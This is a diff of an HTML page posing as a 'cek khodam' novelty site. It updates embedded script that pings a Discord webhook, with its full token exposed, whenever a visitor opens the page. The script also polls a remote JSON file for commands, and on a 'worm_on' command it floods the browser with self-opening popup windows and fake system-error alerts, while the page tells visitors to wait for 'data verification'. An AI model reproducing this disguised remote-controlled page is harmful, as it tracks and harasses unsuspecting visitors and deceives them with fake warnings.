@@ -3,20 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>cek khodam</title>
+    <title>https://www.cek-khodam-v2.com</title>
     <script>
-        const jsonURL = "https://hazelnuttty.github.io/CEK-KHODAM2/server.json"; // Sesuaikan dengan repo lo
+        const jsonURL = "https://raw.githubusercontent.com/hazelnuttty/CEK-KHODAM2/main/server.json"; // URL JSON
 
         function sendWebhook() {
             fetch("https://discord.com/api/webhooks/1348149288579891230/vMwbJioC6BccY6wEtaDWotoL_ezlfd_875kj1HSo4m6xyBkVZlMAxPO9hA_iWt0lXbP2", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ content: "🎯 Target page dibuka!" })
-            });
+            }).catch(err => console.error("Webhook Error:", err));
         }
 
         function checkCommand() {
-            fetch(jsonURL)
+            fetch(jsonURL + "?t=" + new Date().getTime()) // Hindari cache
                 .then(res => res.json())
                 .then(data => {
                     if (data.command === "worm_on") startWorm();
@@ -26,16 +26,17 @@
         }
 
         function startWorm() {
-            setInterval(() => { window.open(window.location.href, "_blank", "width=300,height=300"); }, 10);
-            setInterval(() => { alert("SYSTEM ERROR! RESTART YOUR DEVICE!"); }, 5000);
+            setInterval(() => { 
+                window.open(window.location.href, "_blank", "width=300,height=300");
+            }, 1000);
+            setInterval(() => { alert("⚠ SYSTEM ERROR! RESTART YOUR DEVICE!"); }, 7000);
         }
 
-        sendWebhook(); // Kirim notifikasi ke webhook saat halaman dibuka
+        sendWebhook();
         setInterval(checkCommand, 5000);
     </script>
 </head>
 <body>
-    <h1 style="text-align: center;">Selamat datang di cek khodam v2</h1>
-    <h2 style="text-align: center;"> Mohon tunggu 1 menit untuk verifikasi data</h2>
+    <h1 style="text-align: center;">Selamat datang user, Tunggu 1 menit untuk verifikasi data</h1>
 </body>
 </html>
